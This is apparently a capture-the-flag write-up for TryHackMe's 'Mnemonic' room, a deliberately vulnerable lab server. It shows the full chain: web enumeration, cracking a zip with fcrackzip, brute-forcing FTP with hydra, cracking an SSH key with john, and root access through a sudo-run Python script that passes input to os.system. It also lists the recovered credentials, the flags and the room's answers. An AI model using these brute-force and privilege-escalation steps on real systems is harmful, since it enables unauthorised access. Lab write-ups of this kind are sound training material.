> TryHackMe - Mnemonic
> https://tryhackme.com/room/mnemonic
> Jeff Henschel
> March 23, 2021
--------------------------------------------



![[Screenshot from 2021-03-23 15-40-44.png]]


# Introduction
This is a purposely vulnerable server ran by TryHackMe.  Upon reviewing the main website for this CTF we are given a link to a YouTube video.  This video is a [clip](https://www.youtube.com/watch?v=pBSR3DyobIY). from the 1995 cyberpunk movie _Johnny Mnemonic_.  The goal of this CTF is to answer a myriad of questions from TryHackMe, and to locate and obtain the ```user.txt``` and ```root.txt```

----------------------------------------------

## Summation of path to ```root.txt```
Using `Nmap` it was discovered that the `Ubuntu Linux` server was running 3 services. Running on this server was a `vsFTPd `service on port 21 handling the File Transfer Protocol.  Additionally, there was an `Apache` server running on port 80 handling the Hyper Text Transfer Protocol (HTTP).  Lastly on port 1337, `OpenSSH` was running handling the Secure Socket Layer (SSL).  Checking against common vulnerability databases no services were known to be easily exploitable.

Enumerating the web service, we discovered a directory hidden from ```robots.txt```.  This prevents any search engine crawlers from caching that subdirectory.  The disallowed subdirectory was listed as `/webmasters/*`, which indicates that `/webmasters/` and any further subdirectories or files within that directory would be 'hidden'.  In addition to `/webmasters` we also discovered `/admin` and `/backups` from the `/webmasters` domain.  From `/backups` we find `backups.zip` .  

At this point we've cataloged the following websites/files;
* mnemonic.thm/
* mnemonic.thm/
* mnemonic.thm/webmasters
* mnemonic.thm/webmasters/admin
* mnemonic.thm/webmasters/backup
* mnemonic.thm/webmasters/backup/backup.zip

We obtain the file and verify that it is a `.zip` file and that it is password encrypted.  Utilizing `fcrackzip` we were able to decrypt the password.  After unzipping we find `note.txt` which gives us the FTP username ftpuser.

Using the FTP username I was able to brute-force the password using `hydra`.  From that user we find what appears to be a SSH key, `id_rsa`, also find what turns out to be the associated SSH user `james` from `not.txt`.

Pivoting to the SSH service, we attempted to login using the username `james` and the discovered `id_rsa` private key.  The key is password protected.  Using `johntheripper` we were able to crack the password.  After logging in successfully, after about a minute an IPS/IDS (Intrusion Prevention Systems / Intrusion Detection Systems) script shows us `Unauthorized access was detected`.  Shortly thereafter, we are given a countdown from 10 to 0 and are seemingly kicked out of the SSH session.

We reconnect to the SSH session using the verified credentials from earlier.  Working quickly, we do a system wide search for all files with SUID permissions.  We locate what appears to be 2 files with `base64` encrypted filenames and 2 `.txt` files.   The 2 `.txt` files, `6450.txt` and `noteforjames.txt`,  gave me another username 'condor'.   Additionally we are given information about an image based encryption method named Mnemonic.

[Mnemonic](https://github.com/MustafaTanguner/Mnemonic).  is a steganography tool developed by the CTF creator.  It requires 2 files to successfully decrypt, an image and an code which was given when encrypted.  The code turns out to be in `6450.txt`.  Each of the lines will be an ASCII character.  Which should make our encrypted ASCII 15 characters long.

When decrypted the `base64` filenames give a URL to an image.![[maxresdefault.jpg]]

Using `Mnemonic` we decrypt the previous image and get a password for condor.  Utilizing these credentials I log into an SSH session as condor.  We find that `condor` is able to utilize `/usr/bin/python3 /bin/examplecode.py` with `sudo`.

Inspection of `/bin/examplecode.py` reveals a Python program which appears to give basic system information and services.  Further we see we can exploit the script, by choosing option `0` followed by a `.` when prompted `yes/no`.  Will enable us to run binaries.

```python
if select == 0: 
    time.sleep(1)
        x = str(input("are you sure you want to quit ? yes : "))

if ex == ".":
   print(os.system(input("\nRunning....")))
if ex == "yes " or "y":
       sys.exit()
```

Utilizing this, I am able to run `/bin/bash` as `root`.  From here, I was able to capture the `root.txt`.  After encoding the flag into MD5 the CTF was complete.

----------------------------------------------

# Initial Enumeration
------------------------------------
## Nmap
* Port 21 (FTP) File Transfer Protocol is running vsftpd 3.0.3
* Port 80 (HTTP) Hyper Text Transfer Protocol running Apache 2.4.29
* Port 1337 (SSL) Secure Socket Layer running OpenSSH 7.6p1
* Machine appears to be am Ubuntu machine.

```bash
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
1337/tcp open  ssh     OpenSSH 7.6p1
```

----------------------------------------------
## No low-hanging exploit/vulnerability 
This was confirmed with ```searchsploit```.  Checked all services against it, and found no readily available PoC or exploit.

----------------------------------------
## FTP
### No anonymous login allowed.
```bash
ftp 10.10.6.176
Connected to 10.10.6.176.
220 (vsFTPd 3.0.3)
Name (10.10.6.176:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
```
-----------------------------------------
## Webserver
### Nikto didn't find anything helpful
```bash
nikto -h 10.10.6.176 | tee ~/ctf/thm/mnemonic/nikto.log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.6.176
+ Target Hostname:    10.10.6.176
+ Target Port:        80
+ Start Time:         2021-03-23 19:47:45 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS,sHEAD, GET 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7890 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-03-23 20:15:42 (GMT0) (1677 seconds)
---------------------------------------------------------------------------
```

### robots.txt gave us target.com/webmasters/*
```bash
 cat robots.txt 
User-agent: *
Allow: / 
Disallow: /webmasters/*
```

### Initial Subdirectory Bruteforce

Found a few interesting  subdirectories to enumerate.  ```/admin``` ```/backups```.
```bash
 gobuster dir -u 10.10.6.176/webmasters/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,html,txt,pdf,zip -o gob_extensions.log
===============================================
/admin                (Status: 301) [Size: 321] [--> http://10.10.6.176/webmasters/admin/]
/backups              (Status: 301) [Size: 323] [--> http://10.10.6.176/webmasters/backups/]
/index.html           (Status: 200) [Size: 0]                                               
/index.html           (Status: 200) [Size: 0]   
```
Checking ```/webmasters/admin``` for further subdirectories and files.  A login page which we could brute-force.
```bash
gobuster dir -u 10.10.6.176/webmasters/admin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,html,txt,pdf,zip -o webmasters_admin.log

/admin.html           (Status: 200) [Size: 948]
/index.html           (Status: 200) [Size: 0]  
/index.html           (Status: 200) [Size: 0]  
/login.html           (Status: 200) [Size: 152]
```
Discovering more subdirectories and files from ```/webmasters/backups```.   We find ```backups.zip```.
```bash
gobuster dir -u 10.10.6.176/webmasters/backups/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,html,txt,pdf,zip -o webmasters_backups.log

/backups.zip          (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 0]  
/index.html           (Status: 200) [Size: 0]  
```
----------------------------------------------




# Initial Access
## Get backups.zip from site/webmasters/backups/
```
└─# wget 10.10.6.176/webmasters/backups/backups.zip
--2021-03-23 20:50:26--  http://10.10.6.176/webmasters/backups/backups.zip
Connecting to 10.10.6.176:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 409 [application/zip]
Saving to: ‘backups.zip’

backups.zip                               100%[=====================================================================================>]     409  --.-KB/s    in 0s      

2021-03-23 20:50:27 (91.5 MB/s) - ‘backups.zip’ saved [409/409]

┌──(root💀kali)-[~/ctf/thm/mnemonic]
└─# file backups.zip 
backups.zip: Zip archive data, at least v1.0 to extract
```

## backups.zip is encrypted - fcrackzip FTW!
```bash
┌──(root💀kali)-[~/ctf/thm/mnemonic]
└─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backups.zip 






PASSWORD FOUND!!!!: pw == 00385007
```

## Given a FTP username
```
@vill

James new ftp username: ftpuser
we have to work hard
```

## Bruteforce FTP login
```bash
┌──(root💀kali)-[~/ctf/thm/mnemonic]
└─# hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 10.10.6.176 -t 50 ftp 

[21][ftp] host: 10.10.6.176   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
```

## First Access FTP
Logged in we see that there are a whole lot of directories, enumerating these manually would be a torture, let’s do it the easier way.
```bash
wget -r ftp://ftpuser:love4ever@10.10.6.176
cd 
find . -type f
```
Find `not.txt` giving us another username james
```bash
cat data-4/not.txt 

james change ftp user password
```
Find `id_rsa` private SSH key
```bash
┌──(root💀kali)-[~/ctf/thm/mnemonic/10.10.6.176]
└─# file ./data-4/id_rsa 
./data-4/id_rsa: PEM RSA private key
```
----------------------------------------------
# Access SSH
## Discover the `id_rsa `is password protected
```bash
ssh -i id_rsa james@10.10.6.176 -p 1337
The authenticity of host '[10.10.6.176]:1337 ([10.10.6.176]:1337)' can't be established.
ECDSA key fingerprint is SHA256:nwJynJn7/m7+VP5h40EAKHef3qSEfKTIZsdI8GH+LgI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.6.176]:1337' (ECDSA) to the list of known hosts.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
```

## Crack `id_rsa` using `john` after `ssh2john`
```bash
john --format=SSH hash.txt /usr/share/wordlists/rockyou.txt 

bluelove         (id_rsa)

```

## Login SSH using john

```
james@10.10.255.196's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


51 packages can be updated.
0 updates are security updates.


Last login: Thu Jul 23 20:40:09 2020 from 192.168.1.5
                                                                               
Broadcast message from root@mnemonic (somewhere) (Wed Mar 24 02:03:55 2021):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected. 
 ```
 
## After a short amount of time, we seem to get booted.
 ```
 Broadcast message from root@mnemonic (somewhere) (Wed Mar 24 02:06:55 2021):   
                                                                               
bybye!!!
```

## Attempted to cURL or wget linpeas, couldn't seem to reach out.
```
https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
```

## Tried to initiate with bash as opposed to rbash (restricted bash)
```
ssh -i id_rsa james@box.thm -p 1337 bash
```


## Looked for files w/ SUID permissions.  Below seemed to hang, took off redirect worked fine.
```bash
find / -perm -4000 2>/dev/null 
```

## Take off redirect works fine
### find some base64 encoded filenames
### some usernames as well

```bash
find / -perm -4000 
find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied
find: ‘/home/condor/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='’: Permission denied
ind: ‘/var/spool/cron/crontabs’: Permission denied
find: ‘/var/spool/cron/atjobs’: Permission denied
find: ‘/var/lib/snapd/void’: Permission denied
find: ‘/var/lib/snapd/cookie’: Permission denied
find: ‘/var/lib/update-notifier/package-data-downloads/partial’: Permission denied
find: ‘/var/lib/apt/lists/partial’: Permission denied
find: ‘/home/jeff’: Permission denied
find: ‘/home/mike’: Permission denied
find: ‘/home/ftpuser’: Permission denied
find: ‘/home/condor/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='’: Permission denied
find: ‘/home/condor/.gnupg’: Permission denied
find: ‘/home/condor/.bash_logout’: Permission denied
find: ‘/home/condor/.bashrc’: Permission denied
find: ‘/home/condor/.profile’: Permission denied
find: ‘/home/condor/.cache’: Permission denied
find: ‘/home/condor/.bash_history’: Permission denied
find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied
find: ‘/home/john’: Permission denied
find: ‘/home/alex’: Permission denied
find: ‘/home/vill’: Permission denied
```

## cat files found in home dir
```
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
```

## decrypt base64 filenames
```bash
echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d

https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg

```

```bash
echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d

THM{a5f82a00e2feee3465249b855be71c01}┌
```

[Mnemonic](https://github.com/MustafaTanguner/Mnemonic) is a steganography tool, developed by the room creator.

Using Mnemonic with the image from the base64 decoded link and additonal username from noteforjames.txt decodes to;
```
pasificbell1981
```

## Access SSH with new credentials
### find we can run examplecode.py as sudo
```
Last login: Tue Jul 14 17:58:10 2020 from 192.168.1.6
condor@mnemonic:~$ whoami
condor
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
```
### Run program and seemingly it just reboots
### Inspect code to find vuln.
```python
                if select == 0: 
                        time.sleep(1)
                        ex = str(input("are you sure you want to quit ? yes : "))

                        if ex == ".":
                                print(os.system(input("\nRunning....")))
                        if ex == "yes " or "y":
                                sys.exit()
```


root@mnemonic:/root# cat root.txt 
THM{congratulationsyoumadeithashme}


THM{MD5}
https://www.md5online.org
a4825f50b0c16636984b448669b0586
THM{2a4825f50b0c16636984b448669b0586}

----------------------------------------------

## CREDZ
FTP
ftpuser // love4ever

SSH
james // bluelove + id_rsa
condor // pasificbell1981

----------------------------------------------

# Questions

How many open ports?
`3`

what is the ssh port number?
`1337`

what is the name of the secret file?
`backups.zip`

ftp user name?
`ftpuser`

ftp password?
`love4ever`

What is the ssh username?
`james`

What is the ssh password?
`bluelove`

What is the condor password?
`pasificbell1981`

user.txt
`THM{a5f82a00e2feee3465249b855be71c01}`

root.txt
`THM{2a4825f50b0c16636984b448669b0586}`
